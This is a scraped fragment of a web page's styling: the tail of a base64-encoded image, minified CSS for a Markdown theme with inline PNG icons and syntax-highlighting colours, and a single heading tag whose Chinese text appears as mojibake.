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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
